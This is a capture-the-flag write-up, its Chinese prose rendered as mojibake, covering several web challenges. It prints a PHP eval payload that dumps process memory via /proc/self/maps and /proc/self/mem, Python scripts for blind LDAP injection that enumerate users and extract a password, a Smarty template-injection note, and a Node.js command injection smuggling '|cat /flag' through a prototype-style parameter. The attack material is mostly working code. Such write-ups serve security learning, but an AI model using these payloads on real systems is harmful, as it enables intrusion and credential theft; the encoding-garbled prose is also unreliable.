# æš—æ³‰æ¯



## hideandseek

pwnğŸ‘´å¸¦é£çš„ï¼Œå…¨ç¨‹é€èŒ¶ã€‚

è¯»å†…å­˜æ–‡ä»¶ï¼Œæ ¹æ®/proc/self/mapsçœ‹å†…å­˜æ®µï¼Œå¯¹åº”/proc/self/memå†…å®¹

å…¶å®æ ¸å¿ƒæ€è·¯æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯mapsä¸‹é¢ä¼šå­˜å†…å­˜çš„æ‰€æœ‰åœ°å€

ç„¶åç”¨è¯¥æ€è·¯å»æŠŠmemä¸‹çš„æ–‡ä»¶å…¨éƒ¨è¯»å‡ºæ¥å°±å¥½äº†

```python
#-*- coding:utf-8 -*-
import requests
payload = '''?eval=$maps = fopen("/proc/self/maps", 'r');
$mem = fopen("/proc/self/mem", 'r', 0);
$a = 0;
while (!feof($maps)){
    $inf = fgets($maps);
    $addr = explode(" ",$inf)[0];
    $start = hexdec(explode("-",$addr)[0]);
    $end = hexdec(explode("-",$addr)[1]);if($a<474){while ($end>$start){fseek($mem,$start);$nr = fgets($mem, 0x1000);echo $nr;$start=$start%2B0x1000;}}$a=$a%2B1;
}'''.replace("\n","")
#print(payload)
url = "http://ced01bad-3d00-4bca-8185-eb99e82285ed.nssctf.neusoft.edu.cn/"
url = url + payload
res = requests.get(url).text
print(res.encode('utf-8'))
fp = open("data.txt",'w')
fp.write(res.encode('utf-8'))
fp.close()
```

è¿™é‡Œé‡è§çš„ä¸€ä¸ªé—®é¢˜æ˜¯å¤ªå¤§äº†ï¼Œåˆ†æ®µè¯»å–å³å¯

![image-20211206125128181](https://gitee.com/yyssllz/pic/raw/master/image-20211206125128181.png)



ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜å¯ä»¥åœ¨è¿‡å¤§çš„æ—¶å€™åˆ†æ®µè¯»å–



## easy_inject

çœŸæ˜¯ä¸€ä¸ªï¼Œï¼Œç»ç»å­é¢˜ç›®

æ€è·¯å°±æ˜¯æ‰¾å¾ˆå¤šç”¨æˆ·å

```python
import  string,requests,sys
url = "http://47.106.172.144:2333/"
words = string.digits +string.ascii_lowercase + "@_.-"
name = "ldaptest@test.com)(mail=ldapli"
for i in range(40):
    for i in words:
        payload = name + i +"*"
        params = {"user":payload,"pass":"123"}
        # print(payload)
        res = requests.get(url=url,params=params)
        if "ç”¨æˆ·ä¸å”¯ä¸€" in res.text:
            print(payload)
            # print(res.text)
            name += i
            break
        # if "å¯†ç é”™è¯¯" in res.text:
        #     print(payload)
        #     # print(res.text)
        #     name += i
        #     break
        if i == "-":
            print(name)
            sys.exit(payload)

```

è™½ç„¶è¿™é¢˜æ˜¯è¿™ä¹ˆåšçš„ï¼Œä½†æ˜¯å®é™…ä¸Šæˆ‘é¥¶äº†å¾ˆå¤šå¼¯è·¯ï¼Œå› ä¸ºå‡ºé¢˜äººç»™çš„hintè¯´æ˜¯æ‰¾å±æ€§ï¼Œè€Œä¸”å› ä¸ºç”¨æˆ·åå†²çªäº†ï¼Œpythonå½“æ—¶ä¸çŸ¥é“ä¸ºå•¥æ²¡æœ‰æ‰«å‡ºæ¥ladpliï¼Œæ‰«å‡ºæ¥çš„æ˜¯ladptestè´¦æˆ·ã€å¯¼è‡´æˆ‘èŠ±äº†å¾ˆå¤šæ—¶é—´èµ°äº†å¾ˆå¤šå¼¯è·¯ã€‘

### é¢˜ç›®ä»¥å¤–çš„ä¸€äº›æœ‰è¶£çš„çŸ¥è¯†ç‚¹

#### æ‰«attribute

é¢˜ç›®hintæç¤ºæ˜¯æ‰¾attributeï¼Œç„¶åæˆ‘å°±å†™äº†å¦‚ä¸‹è„šæœ¬æ‰¾ï¼šï¼ˆè¿™é‡Œæ˜¯å‚è€ƒhittheboxçš„é¢˜ç›®ï¼‰

```python
import  string,requests,sys
url = "http://47.106.172.144:2333/"

words = string.digits +string.ascii_lowercase + "@._-"
# username orange yunwei nss@nss.moe ldaptest@test.com laeaf@nss.moe
paylist = open('1.txt')
# print(paylist.read())
flag = 0
usernamelist = ["ldaptest@test.com","orange","yunwei","nss@nss.moe","laeaf@nss.moe"]
# name = "ldaptest@test.com)(fax="
for username in usernamelist:
    # print(username)
    for attribute in paylist:
        flag = 0
        attribute = attribute.strip('\n')
        name = ""
        while flag < 20:
            for i in words:
                payload = "{})({}={}*".format(username,attribute,name+i)
                # print(payload)
                # payload = name + i +"*"
                params = {"user":payload,"pass":"123"}
                # print(payload)
                res = requests.get(url=url,params=params)
                # print(res.text)
                if "ä¸å”¯ä¸€" in res.text:
                    # print(payload)
                    name += i
                    flag+=1
                    break
                    # continue
                if i == "-":
                    print(payload)
                    # dnm = 19
                    flag = 20

                    # sys.exit(payload)
```

ç„¶åæŠŠé»˜è®¤å±æ€§çš„éƒ½è¯•äº†ä¸€éï¼Œåæ¥æ ¹æ®hintè¯´çš„æ˜¯æ‰¾å±æ€§ï¼Œæˆ‘æ€€ç–‘ä¸æ˜¯è‡ªå¸¦å±æ€§ï¼Œå°±æƒ³åŠæ³•å»æ‰¾é¢å¤–å±æ€§ï¼Œå‘ç°æ‰¾ä¸åˆ°ï¼Œå°±åªèƒ½æƒ³åŠæ³•æ³¨å…¥å¯†ç ï¼š

#### æ³¨å…¥å¯†ç 

æ‰¾åˆ°äº†ä¸€ç¯‡2018å¹´æ–‡ç« ï¼šhttps://0xukn.fr/posts/writeupecw2018admyssion/

```python
import  string,requests,sys
url = "http://47.106.172.144:2333/"

words = string.digits +string.ascii_uppercase+string.ascii_lowercase + "@.-"
def str2hexnum(str):
    hexhum=''
    for i in str:
        hexhum=hexhum+hex(ord(i))[2:]
    return hexhum
# print(str2hexnum('z'))
flag = ""
name = "ldapli)(userPassword:2.5.13.18:="
for i in range(40):
    for i in words:
        # print(i)
        p ="\\"+str2hexnum(i)
        tmp ="\\" + ''
        payload = name + p
        # print(payload)
        params = {"user":payload,"pass":"123"}
        # print(payload)
        res = requests.get(url=url,params=params)

        # if "ç”¨æˆ·ä¸å”¯ä¸€" in res.text:
        #     print(payload)
        #     # print(res.text)
        #     name += i
        #     break
        # print(res.text[-20:])
        if "æŸ¥è¯¢ç”¨æˆ·ä¸å”¯ä¸€" in res.text:
            print(i)
            real = (chr(ord(i)-1))
            # print(res.text)
            flag += real
            print(flag)
            name += "\\" + str2hexnum(real)
            break
        if i == "-":
            print(name)
            sys.exit(payload)
        # tmp = i
```

è¿˜çœŸèƒ½å¼„å‡ºæ¥ä¸€ä¸ªå¯†ç ï¼Œæ˜¯orangeç”¨æˆ·çš„å¯†ç hhhã€‚ã€‚





## [èŒ]odd_upload

smartyæ¨¡æ¿æ³¨å…¥

ç›´æ¥ä¼ åˆ°templatesç›®å½•ä¸‹é¢ï¼Œå¼„ä¸ªindex.tplè¦†ç›–å³å¯ï¼Œè¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œè¿™ä¸ªå’Œå‰å‡ å¤©æ¹–æ¹˜æ¯çš„é‚£ä¸ªé¢˜ç›®ç›¸ä¼¼ï¼Œä¸è¿‡è¿™é“é¢˜ç›®è¦ç®€å•ä¸€äº›ï¼Œä¸éœ€è¦è€ƒè™‘ç»•è¿‡



## dirtyrce

é¢˜ç›®æºç :

```js
var express = require('express');
var nodeCmd = require('node-cmd');
var bodyParser = require('body-parser');
const app = express();
var router = express.Router();
const port = 5000;
app.use(bodyParser.urlencoded({
	extended: true
})).use(bodyParser.json());
function isValidIP(ip) {
	var reg = /^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$/;
	return reg.test(ip);
}
app.post("/ping",
function(req, res, next) {
	foo = {};
	b = req.body.cmd;
	if (req.body.ping === undefined) {
		res.send('invalid parm');
		return;
	}
	ping = req.body.ping
	console.log(req.body)
	console.log(ping.ip)


	// console.log(ping);
	// console.log();
	if (ping.time !== undefined) {
		time = Number(ping.time);
		if (time > 10 || time < 1) {
			res.send('invalid time');
			return;
		}
		if (Object.keys(ping).length != 1 && ping.ip !== undefined && ping.ip != '') {
			if (!isValidIP(ping.ip)) {
				res.send('invalid ip addr');
				return;
			}
		}
	} else {
		res.send('need time parm');
		return;
	}
	ip = ((ping.ip !== undefined && ping.ip != '') ? ping.ip: '114.114.114.114');
	// console.log('ping -n ' + time + ' ' + ip);
	nodeCmd.run('ping -n ' + time + ' ' + ip, //WINDOWS USE -n
	function(err, data, stderr)  {
		res.send(data);
		return;
	});

});
app.get('/',
function(req, res, next) {
	res.redirect('index');
});

app.get('/index',
function(req, res, next) {
	res.send('<title>ping test</title><form action="/ping" method="POST">Ip:<input type="text" name="ping[ip]"" placeholder="default value 114 dns"><br>Times:<input type="text" name="ping[time]"  value="1"><input type="submit" value="Ping !"></form> ');
});

app.post('/test',(req,res,next)=>{
	ping = req.body.ping;
	console.log({}.dnm);
	res.send("wtf")
})

app.listen(port);
```





æœ‰è¶£çš„é¢˜ç›®ï¼Œpayloadæ˜¯ï¼š

```
ping[__proto__][ip]=1|cat+/flag
```

è¿™é‡Œç»è¿‡fuzzå‘ç°è¿™æ ·å¯ä»¥æ±¡æŸ“åˆ°pingæ•°ç»„ï¼ˆä½†æ˜¯æ— æ³•è¾¾æˆåŸå‹é“¾æ±¡æŸ“çš„æ•ˆæœï¼‰æ„Ÿåˆ°ç–‘æƒ‘ï¼Œä¸çŸ¥é“åŸç†æ˜¯ä»€ä¹ˆã€‚ã€‚ä½†æ˜¯çŸ¥é“å¯¼è‡´è¿™æ ·çš„åŸå› æ˜¯ï¼š

```js
app.use(bodyParser.urlencoded({
	extended: true
}))
```

ç¿»é˜…äº†ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼š

```
https://github.com/expressjs/body-parser#bodyparserurlencodedoptions
```

è¿™æ ·ä¼šå¯ç”¨qsåº“ï¼Œqsåº“å½“ä¸­æœ‰è¿™ä¹ˆä¸€æ®µï¼š



By default, when nesting objects **qs** will only parse up to 5 children deep. This means if you attempt to parse a string like `'a[b][c][d][e][f][g][h][i]=j'` your resulting object will be:

```js
var expected = {
    a: {
        b: {
            c: {
                d: {
                    e: {
                        f: {
                            '[g][h][i]': 'j'
                        }
                    }
                }
            }
        }
    }
};
var string = 'a[b][c][d][e][f][g][h][i]=j';
assert.deepEqual(qs.parse(string), expected);
```

è¿™æ ·å­çš„è¯å°±å¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆå¯ä»¥æ±¡æŸ“æ•°ç»„äº†ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆä¸ä¼šæ±¡æŸ“åŸå‹é“¾å‘¢ã€‚ã€‚çœŸæ˜¯å¥½å‡ æŠŠæ€ª